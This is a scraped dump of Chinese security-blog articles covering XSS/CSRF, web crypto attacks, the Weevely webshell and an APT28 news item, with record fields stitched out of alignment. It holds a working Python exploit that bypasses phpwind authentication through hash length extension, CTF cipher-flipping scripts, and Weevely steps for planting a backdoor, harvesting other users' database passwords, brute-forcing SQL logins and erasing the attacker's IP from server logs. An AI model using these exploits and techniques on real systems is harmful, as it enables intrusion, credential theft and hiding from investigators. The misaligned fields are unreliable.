，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！XSS与CSRF讲完了，回头我会讲下如何防范XSS与CSRF。今天国庆日，6天后国足将在西安迎战叙利亚，此战胜负十分关键！祝好运！国足队员加油！参考文章：https://segmentfault.com/a/1190000004623125 《 总结 XSS 与 CSRF 两种跨站攻击 》http://www.lxway.com/482281211.htm 《CSRF CORS》学习/（“抄”） 了不少文章（主要是demo代码不想重复写了），侵删。","2016-10-02 14:20:51","Web安全","用大白话谈谈XSS与CSRF","http://nsoad.com/Article/web/20161002/475.html"
"5ccbfa804f2f0a0a7a69c075","常见的Web密码学攻击方式汇总","silence","写在前面所有脚本的导图都是自己写的、画的，如果有不好的地方多多包涵，错误的地方也请指出，谢谢。 分组密码的模式分组密码每次只能处理加密固定长度的分组，但是我们加密的明文可能会超过分组密码处理的长度。这时便需要对所有分组进行迭代，而迭代的方式被称为分组密码的模式。常见的为针对ECB、CBC模式攻击(L-ctf提到其中一种)。 ECBECB模式的全称是Electronic CodeBook模式，将明文分组加密后直接成为密文分组，而密文则是由明文分组直接拼接而成，如图所示： Features：ECB模式是所有模式中最简单的一种。明文分组和密文分组是一一对应的，如果明文分组有相同的那么最后的密文中也会有相同的密文分组。因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果，如图所示（翻转密文分组，那么明文分组也会被翻转）Example：某次CTF遇到的题目思路：以administrator权限登陆就就能获得Flag。判断权限则是根据cookie里面的uid参数，cookie包含username和uid两个参数，均为使用ECB加密的密文，然而username的密文是根据注册时的明文生成的。因此我们可以根据username的明文操纵生成我们想要的uid的密文。经过fuzz发现明文分组块为16个字节，那么我们注册17字节的用户，多出的那一个字节就可以是我们我们希望的UID的值，而此时我们查看username的密文增加部分就是UID的密文，即可伪造UID。注册aaaaaaaaaaaaaaaa1获得1的密文分组,注册aaaaaaaaaaaaaaaa2获得2的密文分组，以此类推源码没找到，好像弄丢了，自己写了个差不多的,有兴趣可以练习ebc.php： &lt;?phpfunction AES($data){    $privateKey = ""12345678123456781234567812345678"";    $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateKey, $data, MCRYPT_MODE_ECB);    $encryptedData = (base64_encode($encrypted));    return $encryptedData;}function DE__AES($data){    $privateKey = ""12345678123456781234567812345678"";    $encryptedData = base64_decode($data);    $decrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $privateKey, $encryptedData, MCRYPT_MODE_ECB);    $decrypted = rtrim($decrypted, ""\0"") ;    return $decrypted;}if (@$_GET['a']=='reg'){    setcookie('uid', AES('9'));    setcookie('username', AES($_POST['username']));    header(""Location: http://127.0.0.1/ecb.php"");    exit();}if (@!isset($_COOKIE['uid'])||@!isset($_COOKIE['username'])){    echo '&lt;form method=""post"" action=""ecb.php?a=reg""&gt;Username:&lt;br&gt;&lt;input type=""text""  name=""username""&gt;&lt;br&gt;Password:&lt;br&gt;&lt;input type=""text"" name=""password"" &gt;&lt;br&gt;&lt;br&gt;&lt;input type=""submit"" value=""注册""&gt;&lt;/form&gt; ';}else{    $uid = DE__AES($_COOKIE['uid']);    if ( $uid != '4'){        echo 'uid:' .$uid .'&lt;br/&gt;';        echo 'Hi ' . DE__AES($_COOKIE['username']) .'&lt;br/&gt;';        echo 'You are not administrotor!!';    }    else {          echo ""Hi you are administrotor!!"" .'&lt;br/&gt;';        echo 'Flag is 360 become better';    }}?&gt;ecb.py： #coding=utf-8import urllibimport urllib2import base64import cookielibimport Cookiefor num in range(1,50):    reg_url='http://127.0.0.1/ecb.php?a=reg'    index_url='http://127.0.0.1/ecb.php'    cookie=cookielib.CookieJar()    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))    opener.addheaders.append(('User-Agent','Mozilla/5.0'))    num=str(num)    values={'username':'aaaaaaaaaaaaaaaa'+num,'password':'123'}    data=urllib.urlencode(values)    opener.open(reg_url,data)    text=opener.open(index_url,data)    for ck in cookie:        if ck.name=='username':            user_name=ck.value    user_name = urllib.unquote(user_name)    user_name = base64.b64decode(user_name)    hex_name = user_name.encode('hex')    hex_name = hex_name[len(hex_name)/2:]    hex_name = hex_name.decode('hex')    uid = base64.b64encode(hex_name)    uid = urllib.quote(uid)    for ck in cookie:        if ck.name=='uid':            ck.value=uid    text=opener.open(index_url).read()    if 'Flag' in text:        print text        break    else:       print numCBCCBC模式的全称是Cipher Block Chaining模式,在此模式中，先将明文分组与前一个密文分组(或为初始化向量IV)进行XOR运算，然后再进行加密。解密则为密文分组先进行解密，然后再进行xor运算得到明文分组，解密过程如图所示(加密则相反)Features：因为CBC模式是将前一个密文分组和明文分组进行混合加密所以，是可以避免ECB模式的弱点。但正因为如此，导致了解密时修改前一个密文分组就可以操纵后一个的解密后的明文分组，可以将前一个密文中的任意比特进行修改（0,1进行互换，也可以叫翻转）因此CBC模式有两个攻击点：①vi向量，影响第一个明文分组 ②第n个密文分组，影响第n+1个明文分组Example：在比赛中遇到过很多次，基本上属于对一个密文分组进行翻转之后能够提升权限或者绕过验证的作用，自己写了一个差不多的，攻击密文的，大家可以看看大概就是这样，要获得FLAG需要让ID=0，而我们是可以从URL中知道密文的http://127.0.0.1/cbc2.php?a=89b52bac0331cb0b393c1ac828b4ee0f07861f030a8a3dc4b6e786f473b52182000a0d4ce2145994573a92d257a514d1我们现在要对密文进行翻转攻击，但是并不清楚哪部分对应的是ID的上一个密文，可以直接脚本进行FUZZ，也可是使用burp(intruder)进行测试（选择攻击的密文）选择攻击模式攻击结果burp的翻转并不是遍历所有翻转的可能每一位变动一次，比如101101的第一次为101100，那么的二次就是101110，第三次是101000，依次类推。所以burp可能无法完全翻转出需要的payload，但是可以帮我确定需要翻转的位置，我们经过简单的计算就能得到自己需要的值比如这里进过对比，我们轻松的找到了需要翻转的位置，但是却没有得到为0的翻转，数学不及格的我来算算。xor运算的特点:a xor b =c abc三个数任意两个运算可得到第三个，所以0b的10进制是1111xor5=1414xor0=1414的十进制为0eFUZZ反转成功。最后在提醒下：AES128位一组，换成16进制其实我们反转的的是第一组。但影响的却是第二组我们这个演示的是攻击密文的，攻击iv的，基本相似，有兴趣的可以去看看OWASP里面的，那个是攻击iv的cbc.php： &lt;?php  $cipherText = $_GET['a'];//89b52bac0331cb0b393c1ac828b4ee0f07861f030a8a3dc4b6e786f473b52182000a0d4ce2145994573a92d257a514d1$padkey = hex2bin('66616974683434343407070707070707');$iv = hex2bin('f4ebb2df9c29efd7625561a15096cd24');$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');    if (mcrypt_generic_init($td, $padkey, $iv) != -1)    {        $p_t = mdecrypt_generic($td, hex2bin($cipherText));        mcrypt_generic_deinit($td);        mcrypt_module_close($td);    $p_t = trimEnd($p_t);    $tmp = explode(':',$p_t);    if ($tmp[2]=='0'){        print @'id:'.@$tmp[2].'&lt;br/&gt;';         echo 'Flag is T00ls become better';    }    else{echo 'Your are noob!fuck noob!!';        echo @'&lt;br/&gt;id:'.@$tmp[2].'&lt;br/&gt;';        echo @'name:'.@$tmp[0].'&lt;br/&gt;';        echo @'email:'.@$tmp[1].'&lt;br/&gt;';    }}     function pad2Length($text, $padlen){        $len = strlen($text)%$padlen;        $res = $text;        $span = $padlen-$len;    for($i=0; $i&lt;$span; $i++){            $res .= chr($span);        }    return $res;    }function trimEnd($text){        $len = strlen($text);        $c = $text[$len-1];        if(ord($c) &lt;$len){            for($i=$len-ord($c); $i&lt;$len; $i++){                if($text[$i] != $c){                    return $text;                }            }            return substr($text, 0, $len-ord($c));        }        return $text;    }Hash-Length-Extension-Attack许多算法都使用的Merkle–Damgård construction,比如MD5，和SHA-1等，因此这些算法都受到Length-Extension-Attack。要说清这个攻击原理，我们还是简单说说SHA-1Features：SHA-1处理消息前会先对消息进行填充，使整个消息成为512比特的整数倍，每个分组均为512比特①填充(Padding)，方式为将多余的消息后面加一位，且为1，然后后面全部使用0填充使整个分组变为448比特，而最后的64比特会记录原始消息的长度，填充后每个分组均为512比特。②然后就是复杂的数学计算~_~我也看的不是特别懂，但是并不影响我们理解。简单说说就行，首先会定义5个32比特的值（缓冲区初始值，是不是加起来刚好160比特~~，可以理解为iv），然后大概就是每个分组会经过了80步的处理，然后会输出新的5个32比特的值，这个时候我们可以理解原始消息已经充分混入这160比特里面，再用这5个数作为初始值去去处理下一个分组,依次类推，最后得到的hash其实就是这5个数，可以看看我画的便于理解的草图：Example：Hash-Length-Extension-Attack ，可以在知道MD5(message)的hash值得情况下，算出MD5(message+padding+a)的hash值，就是根据短的消息的hash算出更长的消息的hash。为什么呢，其实看了上面的图就会觉得很简单了。我们把hash反排序一下不久又得到5个新的32个比特值吗（此处是可以逆向MD5的算法的），我们可以用这5个数继续消息混合，而我们之前padding的数据就会成为整个消息的一部分说以能够算出MD5(message+padding+a)，a就是我们要继续混合的消息。这类漏洞一般出现在CTF中比较多，类型都是费否等于MAC == hash(message+test)  message未知或者只知晓一部分，不过都不重要，重要是的message的长度，因为会影响到拓展后的消息，不知道的话就需要爆破，然后test位置可控，这样才能拓展，MAC一般也是可控，校验通过就能下一步哈哈，或者拿flag。之前我们都是看的CTF(L-ctf也有一部分，拓展后可以下载压缩包)，我们就来看看phpwind的MD5 padding 漏洞其实是windidserver接口验证缺陷，用扩展攻击绕过验证就可以执行接口中的其他控制器中的其他方法~~这个函数会在执行控制其方法之前执行，进行验证，然而我们发现$_windidkey可以自己输入，只要是appkey的结果相等就能通过验证 public  function beforeAction($handlerAdapter) {  parent::beforeAction($handlerAdapter);  $charset = 'utf-8';  $_windidkey = $this-&gt;getInput('windidkey', 'get');  $_time = (int)$this-&gt;getInput('time', 'get');  $_clientid = (int)$this-&gt;getInput('clientid', 'get');  if (!$_time || !$_clientid) $this-&gt;output(WindidError::FAIL);  $clent = $this-&gt;_getAppDs()-&gt;getApp($_clientid);  if (!$clent) $this-&gt;output(WindidError::FAIL);  if (WindidUtility::appKey($clent['id'], $_time, $clent['secretkey'], $this-&gt;getRequest()-&gt;getGet(null), $this-&gt;getRequest()-&gt;getPost()) != $_windidkey)  $this-&gt;output(WindidError::FAIL);  $time = Pw::getTime();  if ($time - $_time &gt; 1200) $this-&gt;output(WindidError::TIMEOUT);  $this-&gt;appid = $_clientid; }既然都已经说了是这类型的漏洞，那我们肯定就要找能找到的hashshowFlash这里满足要求（打印出了hash  822382cb79f915c779943a1dc131f00c） public function showFlash($uid, $appId, $appKey, $getHtml = 1) {$time = Pw::getTime();$key = WindidUtility::appKey($appId, $time, $appKey, array('uid'=&gt;$uid, 'type'=&gt;'flash', 'm'=&gt;'api', 'a'=&gt;'doAvatar', 'c'=&gt;'avatar'), array('uid'=&gt;'undefined'));$key2 = WindidUtility::appKey($appId, $time, $appKey, array('uid'=&gt;$uid, 'type'=&gt;'normal', 'm'=&gt;'api', 'a'=&gt;'doAvatar', 'c'=&gt;'avatar'), array());我们再跟踪appkey public static function appKey($apiId, $time, $secretkey, $get, $post) {// 注意这里需要加上__data，因为下面的buildRequest()里加了。$array = array('windidkey', 'clientid', 'time', '_json', 'jcallback', 'csrf_token',   'Filename', 'Upload', 'token', '__data');$str = '';ksort($get);ksort($post);foreach ($get AS $k=&gt;$v) {if (in_array($k, $array)) continue;$str .=$k.$v;}foreach ($post AS $k=&gt;$v) {if (in_array($k, $array)) continue;$str .=$k.$v;}return md5(md5($apiId.'||'.$secretkey).$time.$str);}经过各种排序，我们可以得出这个hash的值和消息的结构822382cb79f915c779943a1dc131f00c = md5（md5().$time.$str）822382cb79f915c779943a1dc131f00c= md5 +1475841959 + adoAvatarcavatarmapitypeflashuid2uidundefined里面的md5值不知道，但是是32位，$time.$str都是可控，那么我们就可以拓展这个消息，得到新的hash,而调用这个函数进行验证的得地方自然也就绕过了验证  $_windidkey我们只要传入拓展后的hash即可绕过。因为我们拓展时必须保持md5 +1475841959 + adoAvatarcavatarmapitypeflashuid2uidundefined的结构，然而排序的时候回因为传入的a(action)参数导致打乱循序，无法扩展，但是因为phpwind的路由支持post,所以post一下控制器(c)，模块(m)，动作(a)这三个参数$_windidkey（我们拓展的hash）== md5 +1475841959 + adoAvatarcavatarmapitypeflashuid2uidundefined +padding +alistcappmapi(post排序的)正好绕过验证填写一下cookie和url就可以获得secretkey（调用的list方法，要实现其他action自行修改，getshell就暂不讨论，这不是我们这里的重点 #coding=utf-8import urllibimport urllib2import timeimport cookielibimport gzipimport StringIOfrom bs4 import BeautifulSoupimport reimport hashpumpyimport sysreload(sys)sys.setdefaultencoding('utf-8')def get_key(url):    url = url + '/?m=profile&amp;c=avatar&amp;_left=avatar'    response = opener.open(url)    html = response.read()    if response.info().get('Content-Encoding') == 'gzip':        stream = StringIO.StringIO(html)        with gzip.GzipFile(fileobj=stream) as f:            html = f.read()    soup = BeautifulSoup(html, 'lxml')    key_url = soup.find('param',attrs={'name':'FlashVars'}).get('value')    key_url = urllib.unquote(key_url)    rule = 'uid=(.+?)&amp;windidkey=(.+?)&amp;time=(.+?)&amp;clientid=(.+?)&amp;type'    Pattern = re.compile(rule, re.S)    rs = re.findall(Pattern, key_url)    return rs[0]def padding_exten(windidkey,time,uid):    hexdigest = windidkey    original_data = time+'adoAvatarcavatarmapitypeflashuid'+uid+'uidundefined'    data_to_add = 'alistcappmapi'    key_length = 32        result = list()    rs = hashpumpy.hashpump(hexdigest,original_data,data_to_add,key_length)    result.append(rs[0])    tmp = str(rs)    tmp = tmp.split(',')[1]    tmp = tmp.split(""\'"")[1]    tmp = tmp.replace('\\x','%')       rule = 'undefined(.+?)alist'    Pattern = re.compile(rule, re.S)    tmp = re.findall(Pattern, tmp)    result.append(tmp[0])     return resultif __name__ == '__main__':    url = 'http://192.168.0.100/phpwind'    cookie = 'CNZZDATA1257835621=169451052-1472798292-null%7C1472798292; PHPSESSID=5adaadb063b4208acd574d3d044dda38; ECS[visit_times]=5; csrf_token=ab686222777d7f80; xzr_winduser=PbUcCS1OT1ZjCzY8GoJOV8EOvix9OdGpc%2BmWBPYV6ar07B7AZSOhSw%3D%3D; xzr_lastvisit=7%091475751418%09%2Fphpwind%2F%3Fm%3Dprofile%26c%3Davatar%26_left%3Davatar; xzr_visitor=cx59FPbNJ4FYG2e9cWKpUP%2FTZTef7Yu4DTFLTftwwZ%2FPEVo8'    cj = cookielib.CookieJar()    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))    opener.addheaders.append(        ('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'))    opener.addheaders.append(('Accept', '*/*'))    opener.addheaders.append(('Accept-Language', 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'))    opener.addheaders.append(('Accept-Encoding', 'gzip, deflate'))    opener.addheaders.append(('Connection', 'keep-alive'))    opener.addheaders.append(('Cookie', cookie))    opener.addheaders.append(('Cache-Control', 'max-age=0'))    uid, windidkey, time, clientid = get_key(url)    windidkey, padding = padding_exten(windidkey,time,uid)    payload = '/windid/index.php?time='+time+'&amp;windidkey='+windidkey+'&amp;clientid='+clientid+'&amp;adoAvatarcavatarmapitypeflashuid'+uid+'uidundefined='+padding    url = url + payload    data = {'m':'api','c':'app','a':'list'}    data = urllib.urlencode(data)    response = opener.open(url,data)    html = response.read()    if response.info().get('Content-Encoding') == 'gzip':        stream = StringIO.StringIO(html)        with gzip.GzipFile(fileobj=stream) as f:            html = f.read()    print html后记小弟自己的理解，如果有错误的地方欢迎指正。","2016-10-14 00:57:05","Web安全","常见的Web密码学攻击方式汇总","http://nsoad.com/Article/web/20161014/541.html"
"5ccbfa804f2f0a0a7a69c076","Sofacy（又被称为“Fancy Bear”、“Sednit”、“STRONTIUM”或“APT28”）是一个至少从2008年就开始活跃的并且使用俄语的高级威","Kong","Weevely简介Weevely是一款python编写的webshell管理工具，作为编写语言使用python的一款工具，它最大的优点就在于跨平台，可以在任何安装过python的系统上使用。本文介绍的不是它最基本的功能，而是在渗透测试过程中使用它的奇淫技巧。安装运行Linux：（python2.7版本的Debian/Ubuntu）$sudo apt-get install g++ python-pip libyaml-dev python-dev$sudo pip install prettytable Mako PyYAML python-dateutil PySocks --upgradeOS X$ sudo port install python27 py27-pip$ sudo port select --set pip pip27$ sudo port select --set python python27$ sudo pip install prettytable Mako PyYAML python-dateutil readline PySocks --upgradeWindowspip install prettytable Mako PyYAML python-dateutil pyreadline PySocks --upgrade安装Python 2.7和pip包管理器，然后使用ez_setup.py安装。基本用法root@kali:~# weevely [+] weevely 3.2.0[!] Error: too few arguments[+] Run terminal to the target    weevely &lt;URL&gt; &lt;password&gt; [cmd][+] Load session file    weevely session &lt;path&gt; [cmd][+] Generate backdoor agent    weevely generate &lt;password&gt; &lt;path&gt;生成一个后门木马：root@kali:~# weevely generate test hello.phpGenerated backdoor with password 'test' in 'hello.php' of 1486 byte size.root@kali:~# find / -name hello.php/usr/share/weevely/hello.php连接后门：root@kali:~# weevely http://192.168.110.129/hello.php test[+] weevely 3.2.0[+] Target:    winxp-0947be9ad:C:\phpstudy\WWW[+] Session:    /root/.weevely/sessions/192.168.110.129/hello_0.session[+] Shell:    System shell[+] Browse the filesystem or execute commands starts the connection[+] to the target. Type :help for more information.weevely&gt; 奇淫技巧获取其他用户的凭据本技巧演示如何在共享的托管服务器上获取其他用户凭据1、查找包含其他web用户的文件夹weevely&gt; ls...memberswww-data@target:/var/www PHP&gt; cd memberswww-data@target:/var/www/members PHP&gt; ls...alefstanssotlatrwoleemptmartolnatstarogjasrotozytstancvirotsyynostwww-data@target:/var/www/members PHP&gt;2、使用grep命令查找其他用户存储在php脚本中的密码www-data@target:/var/www/members PHP&gt; grep . '^[^*/#]*passw?o?r?d?'./virots/config.php:$CFG-&gt;dbpass    = 'FFFklasdhas()asdjj';   // your database password./anssot/moodle/config.php:$CFG-&gt;dbpass    = 'kasdhBSAUIGS77&amp;';   // your database password./leempt/wp/wp-config.php:define('DB_PASSWORD', 'AShasjdh177!@');./alefst/wordpress/wp-config.php:define('DB_PASSWORD', 'ajhfaifh123!');./martol/wordpress/wp-config.php:define('DB_PASSWORD', 'monkeydust1234');./yynost/sites/default/settings.php:    'password' =&gt; 'XXyyynotsgoghia(XX',./martol/drupal-7.x/sites/default/settings.php:    'password' =&gt; 'jhj@&amp;&amp;hgdas98k',./natsta/drupal/sites/default/settings.php:    'password' =&gt; '99copacabana',www-data@target:/var/www/members PHP&gt; 3、我们发现一些连接数据库的语句。www-data@target:/var/www/members PHP&gt; grep . 'mysql_conn'./rotozy/joosep-lineon/db.php:$g_link = mysql_connect( '10.4.4.24', 'rotozy', 'rotozy123') or die();www-data@target:/var/www/members PHP&gt;4、我们可以使用sql_console模块来连接www-data@target:/var/www/members PHP&gt; :sql_console -user rotozy -passwd rotozy123 -host 10.4.4.7rotozy@server7 SQL&gt; SELECT USER();+----------------+| rotozy@server7 |+----------------+rotozy@server7 SQL&gt; 绕过策略读取/etc/passwd某些php配置阻止了对系统文件的任何直接访问（参见open_basedir），但是这些文件对于权限提升很有帮助，这时候我们就要想方法绕过了。weevely中的模块audit_etcpasswd帮我们解决了这个问题。1、我们先尝试直接访问目标文件www-data@target:/var/www/html PHP&gt; cd /etc[-][cd] Failed cd '/etc': no such directory or permission deniedwww-data@target:/var/www/html PHP&gt; cat /etc/passwd[-][download] File download failed, please check remote path and permissions2、不能访问，我们来使用模块audit_etcpasswdwww-data@target:/var/www/html PHP&gt; :audit_etcpasswd --helpusage: audit_etcpasswd [-h] [-real]                       [-vector {posix_getpwuid,file,fread,file_get_contents,base64}]Get /etc/passwd with different techniques.optional arguments:  -h, --help            show this help message and exit  -real                 Filter only real users  -vector {posix_getpwuid,file,fread,file_get_contents,base64}www-data@target:/var/www/html PHP&gt; :audit_etcpasswdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinyzer:x:1000:1000:yzer,,,:/home/yzer:/bin/bashwww-data@target:/var/www/html PHP&gt;可以看见成功读取。猜解SQL用户凭据本技巧教大家如何猜解多个SQL用户的凭据。1、先来查看用户，无法直接查看，请看上面一个技巧www-data@target:/var/www/html PHP&gt; cd ..[-][cd] Failed cd '..': no such directory or permission deniedwww-data@target:/var/www/html PHP&gt; cat /etc/passwd[-][download] File download failed, please check remote path and permissionswww-data@target:/var/www/html PHP&gt; :audit_etcpasswd -realroot:x:0:0:root:/root:/bin/bashroblast:x:1000:1000:roblast,,,:/home/roblast:/bin/bashmicjanost:x:1001:1001:micjanost,,,:/home/micjanost:/bin/bashpjgomes:x:1002:1002:pjgomes,,,:/home/pjgomes:/bin/bashpdpeers:x:1003:1003:pdpeers,,,:/home/pdpeers:/bin/bashwww-data@target:/var/www/html PHP&gt;2、使用bruteforce_sql猜解密码www-data@target:/var/www/html PHP&gt; :bruteforce_sqlerror: too few argumentsusage: bruteforce_sql [-h] [-hostname HOSTNAME] [-users [USERS [USERS ...]]]                      [-pwds [PWDS [PWDS ...]]] [-fusers FUSERS]                      [-fpwds FPWDS]                      {mysql,pgsql}Bruteforce SQL databasepositional arguments:  {mysql,pgsql}         Service to bruteforceoptional arguments:  -h, --help            show this help message and exit  -hostname HOSTNAME    Hostname  -users [USERS [USERS ...]]                        Users  -pwds [PWDS [PWDS ...]]                        Passwords  -fusers FUSERS        Local file path containing users list  -fpwds FPWDS          Local file path containing password listwww-data@target:/var/www/html PHP&gt; :bruteforce_sql mysql -users roblast micjanost pjgomes pdpeers root -fpwds wordlists/huge.txt roblast:reckonedpjgomes:nationalroot:Gilchristwww-data@target:/var/www/html PHP&gt;3、成功猜解除三个用户密码，我们使用sql_console连接www-data@target:/var/www/html PHP&gt; :sql_console -u root -p Gilchristroot@localhost SQL&gt; show databases;+--------------------+| mysql              || performance_schema || test               || appdb              |+--------------------+root@localhost SQL&gt; 日志清理本技巧教大家如何清除服务器中的跟踪记录。1、首先找到日志存放的文件夹，下例是存放在log文件夹中weevely&gt; ls...htdocslogscpanel.profilecgi-binmember@target:/home/member PHP&gt; cd logsmember@target:/home/member/logs PHP&gt; ls...access.logmember@target:/home/member/logs PHP&gt;2、我们使用system_info命令找到我们自己的ipmember@target:/home/member/logs PHP&gt; :system_info -info client_ip174.122.136.104member@target:/home/member/logs PHP&gt;3、我们使用grep命令来确认我们的ip记录在日志文件中member@target:/home/member/logs PHP&gt; grep access.log 174.122.136.104174.122.136.104 - - [21/Apr/2015:20:37:04 +0100] ""GET /agent.php HTTP/1.1"" 200 443 ""http://www.google.co.uz/url?sa=t&amp;rct=j&amp;source=web&amp;cd=136&amp;ved=d7fQaxNTP&amp;ei=qpG-lx-Uque6l97bG_EZfE&amp;usg=FL237uTSYjAc8DC-d971rS4UUPyWV13nyK"" ""Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9b3) Gecko/2008020514 Firefox/3.0b3""174.122.136.104 - - [21/Apr/2015:20:34:01 +0100] ""GET /agent.php HTTP/1.1"" 200 443 ""http://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=auto&amp;tl=en&amp;usg=200QawVTBiv_BPoQJdoQhA-yTa66mtGaEA"" ""Opera/9.52 (Macintosh; Intel Mac OS X; U; pt-BR)""174.122.136.104 - - [21/Apr/2015:20:28:24 +0100] ""GET /agent.php HTTP/1.1"" 200 443 ""http://www.google.com.uy/url?sa=t&amp;rct=j&amp;source=web&amp;cd=183&amp;ved=DJY1U23wu&amp;ei=GfRq0HsncZ7nn32louwyv0&amp;usg=oYydfzk5nYywMujSFCTAmFvz3i3U7IYMDW"" ""Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 MRA 5.4 (build 02647) Firefox/3.5.6 (.NET CLR 3.5.30729)""4、我们可以看到我们IP地址的活动已经被记录，我们可以再次使用grep来从日志中删除我们的ip，然后将其保存到临时文件中member@target:/home/member/logs PHP&gt; grep access.log -v 174.122.136.104 -output cleaned.logmember@target:/home/member/logs PHP&gt;5、让我们来测试看看是否已经删除了member@target:/home/member/logs PHP&gt; grep cleaned.log 174.122.136.104member@target:/home/member/logs PHP&gt;6、然后我们就可以用cleaned.log来替换access.logmember@target:/home/member/logs PHP&gt; rm access.logmember@target:/home/member/logs PHP&gt; cp cleaned.log access.logmember@target:/home/member/logs PHP&gt; rm cleaned.log绕过系统禁用函数1、我们将使用的是audit_disablefunctionbypass模块，它会上传.htaccess和CGI脚本，并在远程服务器上运行伪系统shell。weevely&gt; www-data@target:/var/www/html PHP&gt; :audit_disablefunctionbypass[-][disablefunctionbypass] After usage, use ':file_rm' to remove '/var/www/html/.htaccess' and '/var/www/html/acubu.ved'[-][disablefunctionbypass] Run console without reinstalling with ':audit_disablefunctionbypass -just-run http://localhost/acubu.ved'[-][disablefunctionbypass] Type 'quit' to return to weevely shell. Requests are not obfuscatedCGI shell replacement $ ps -aux  PID TTY          TIME CMD24693 ?        00:00:00 apache224694 ?        00:00:00 apache224695 ?        00:00:00 apache224696 ?        00:00:00 apache224697 ?        00:00:00 apache224859 ?        00:00:00 acubu.ved24864 ?        00:00:00 psCGI shell replacement $ quitwww-data@emilio-lin:/var/www/html PHP&gt; 总结weevely并不止本文所介绍的这些技巧，具体还是要大家多使用，这样才能发现更多的奇淫技巧，也欢迎大家来分享自己的心得。","2016-10-27 00:45:57","安全工具","渗透利器Weevely之奇淫技巧篇","http://nsoad.com/Security-tools/20161027/tools-641.html"
"5ccbfa804f2f0a0a7a69c077","HTTP fo","Kong","Sofacy（又被称为“Fancy Bear”、“Sednit”、“STRONTIUM”或“APT28”）是一个至少从2008年就开始活跃的并且使用俄语的高级威胁组织。其攻击目标主要为全球的军事机构和政府机构。该攻击组织自从2014年进入公众视线后，一直没有停止其攻击行动。不仅如此，安全专家最近还发现Sofacy组织在攻击中使用了最新的和更高级的工具。根据Palo Alto Networks公司所言，该组织主要针对乌克兰国防组织以及邻国的外交部等进行APT攻击。Sofacy通过伪装成欧洲议会出版社的鱼叉式网络钓鱼邮件，传播恶意文件感染受害者。Flash exploits隐藏于多层办公文件中该鱼叉式钓鱼邮件通过发布一个关于“俄罗斯可能入侵乌克兰”的恶意文件来吸引收件人的注意。据Palo Alto公司的研究人员表示，一旦受害者打开这些文件，他们将看到众多虚假文件，包含从国际新闻媒体上复制粘贴下来的文本。而在这些文件下面，原始文件将通过对象连接与嵌入技术（Object Linking and Embedding，OLE）加载另一个Word文档，其中包含Adobe Flash SWF文件。这些双层嵌套（double-nested）的办公文件将试图利用用户的个人电脑中未打补丁的Flash漏洞。Sofacy研发了新型Flash开发框架安全研究人员称，他们发现了两种截然不同的攻击，使用这些策略部署两种不同版本的嵌入式Flash SWF文件，他们称其为“DealersChoice”。攻击者在8月相连的两个星期内，部署了两个版本：DealersChoice.A和DealersChoice.B。两者之间的差异非常明显，DealersChoice.A是一个独立的开发包（exploitation package），而DealersChoice.B则是一个模块化系统，与一个在线指挥和控制（C&amp;C）服务器之间进行交流。对于DealersChoice.A，该恶意软件分析当前Flash版本的本地系统，并传递包含其中的一个有效载荷。对于DealersChoice.B，初始模块会扫描系统并通知服务器，只发送适当的开发包到受害者的电脑中。DealersChoice利用的漏洞包括：CVE-2016-4117，CVE-2016-1019和CVE-2015-7645等。安全专家怀疑，DealersChoice是Sofacy组织研发的新开发框架的产品。我们暂时还不清楚这两个变体是否是两种独立的工具，又或者DealersChoice.B是否由DealersChoice.A演变而来。基础设施与Sofacy此前的攻击活动相关Palo Alto研究人员表示，鱼叉式钓鱼邮件发往的基础设施，及指挥和控制（C&amp;C）服务器所在的托管地，都与Sofacy组织此前的攻击活动相关。因为该组织使用了相同的电子邮件地址注册了域名，这些域名与当前这些攻击和此前的攻击活动有关。Palo Alto安全专家表示：“DealersChoice是一个漏洞平台，允许Sofacy组织利用Adobe Flash中的漏洞发起攻击。跨平台漏洞是Sofacy组织的明显关注点，因为DealersChoice中包含检测功能，能确定目标系统的操作系统。这些检测还可以针对苹果的OS X操作系统，加上我们此前发现的Sofacy组织开发的Komplex OSX木马，意味着该组织能够在Windows和苹果操作环境中实现操作。”关于Komplex OSX木马2016年9月，安全研究人员发现新型Mac OS?X木马“Komplex”，研究人员称该木马与网络间谍组织Sofacy有关。因为Komplex木马病毒中的恶意编码与黑客组织Sofacy曾通过钓鱼邮件攻击美国政府的Carberp木马病毒相同。至少可以确定的是，Carberp木马病毒和Komplex木马病毒使用至少是同一个设计框架。该病毒以“俄罗斯太空计划”作为诱饵，而且针对Mac OS X操作系统。在入侵装有Mac OS X 系统的电脑后，会自动保存一个声称与俄国太空计划有关的PDF文件，用户打开文件后就会中招。Palo 